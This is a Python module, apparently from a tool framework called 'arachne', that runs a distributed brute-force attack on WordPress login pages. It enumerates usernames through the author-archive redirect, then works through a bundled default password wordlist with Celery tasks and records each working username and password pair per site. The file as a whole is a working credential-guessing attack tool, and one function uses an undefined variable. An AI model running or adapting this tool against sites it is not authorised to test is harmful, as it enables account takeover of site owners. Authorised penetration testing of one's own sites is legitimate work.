from __future__ import absolute_import

from arachne.utils import celery_output, strip_open, pwd
from arachne.base import Chooser, InObject
from arachne.browser import Browser
from arachne.celery import celery
from celery import Task, group
from re import findall
from os import path
import sys

DEFAULT_WORDLIST = strip_open(path.join(pwd, 'arachne', 'scripts', 'defaults', 'wp_pass'))

WP_BUSER = 'Invalid username.'
WP_GDKEY = 'codex'
WP_VALID = ['loginform']

name = 'wp-brute'
def base_wp_init(url, browser_args):
    b = Browser(name, **browser_args)
    r = b.go(url)

    params = {  'log'       :   'admin',
                'wp_submit' :   'Log In',
                'pwd'       :   'admin'}

    redirect = findall('"redirect_to" value="([\w\d\:\.\/\-\=\&\%\+;\_\?\#\;\,]*)"', r.text)
    testcook = findall('"testcookie" value="([\w\d\:\.\/\-\=\&\%\+;\_\?\#\;\,]*)"', r.text)

    if redirect:
        params['redirect_to'] = redirect[0]
    if testcook:
        params['testcookie'] = testcook[0]

    return params

def base_wp_brute(url, browser_args, params):
    b = Browser(name, **browser_args)
    r = b.go(url, data=params)

    if WP_GDKEY in r.text:
        return url

def base_find_user(url, browser_args, params):  
    WP_LOGIN = 'wp-login.php'
    b = Browser(name, **browser_args)

    url_author = url.replace(WP_LOGIN, '?author=1')
    r = b.go(url_author)

    user = ''
    if 'author/' in r.url:
        user = findall('author\/([\d\w\-]+)\/', r.url + '/')[0]
    elif 'archive author author-' in r.text:
        pos_user = findall('archive author author-([\d\w\-]+)', r.text)
        if pos_user:
            user = pos_user[0]      
    if not user:
        return

    params['log'] = user
    params['pwd'] = user
    return params

def out_format(item, params):
    return item + ' ||| ' + params['log'] + ':' + params['pwd']

@celery.task(name='arachne.scripts.wp_user')
def wp_user(url, browser_args, job_name, out_name, params):
    user = base_find_user(url, browser_args, params)
    if user:
        wp_brute.delay(url, browser_args, job_name, out_name, params)

@celery.task(name='arachne.scripts.wp_init')
def wp_init(url, browser_args, job_name, out_name):
    params = base_wp_init(url, browser_args)

    b = Browser(name, **browser_args)
    r = b.go(url, data=params)

    if WP_GDKEY in r.text:
        celery_output.delay(out_format(out, params), name, job_name, out_name)      
    elif WP_BUSER in r.text:
        wp_user.delay(url, browser_args, job_name, out_name, params)
    else:
        wp_brute.delay(url, browser_args, job_name, out_name, params, 1)

class WpList(Task):
    def __init__(self):
        self.plist = DEFAULT_WORDLIST
        self.plen = len(self.plist)

@celery.task(name='arachne.scripts.wp_brute', base=WpList)
def wp_brute(url, browser_args, job_name, out_name, params, pnum=0):
    if pnum:
        params['pwd'] = wp_brute.plist[pnum-1]

    out = base_wp_brute(url, browser_args, params)
    if out:
        return celery_output.delay(out_format(out, params), name, job_name, out_name)
    
    if pnum <= wp_brute.plen:
        wp_brute.delay(url, browser_args, job_name, out_name, params, pnum+1)

class BaseWpBrute( Chooser ):
    def __init__(self):
        desc = 'Run a brute force against a list of wordpress login pages'
        super(BaseWpBrute, self).__init__(name, desc)

    def init_async(self, cls, obj):
        obj.core = wp_init

    def init_local(self, cls, obj):
        cls.init_wp = init_wp
        cls.do_brute = do_brute
        obj.phases = [obj.init_wp, obj.do_brute]
        obj.in_object['pwd'] = 0
        obj.in_object['params'] = {}
        obj.plist = DEFAULT_WORDLIST
        obj.plen = len(DEFAULT_WORDLIST)

def do_brute(self, my_link):
    if my_link.pwd:
        my_link.params['pwd'] = self.plist[my_link.pwd - 1]

    try:
        match = base_wp_brute(my_link.item, self.browser_args, my_link.params)
    except Exception as e:
        return self.error_catch('do brute', my_link, e)        

    if match:
        self.output.append(out_format(my_link.item, my_link.params))
    elif my_link.pwd <= self.plen:
        my_link.pwd += 1
        self.add(my_link)

def init_wp(self, my_link):
    if my_link.pwd:
        return do_brute(my_link)
    
    try:
        params = base_wp_init(my_link.item, self.browser_args)
    except Exception as e:
        return self.error_catch('wp init', my_link, e)
        
    b = Browser(name, **self.browser_args)
    r = b.go(my_link.item, data=params)

    if not all(x in r.text for x in WP_VALID):
        return

    if WP_GDKEY in r.text:
        return self.output.append(out_format(my_link.item, params))
    elif WP_BUSER in r.text:
        params = base_find_user(my_link.item, self.browser_args, params)
        if not params:
            return
    my_link.params = params
    self.to_input.append(my_link)

def main():
    s = BaseWpBrute()
    s.start()

if __name__ == "__main__":
    main()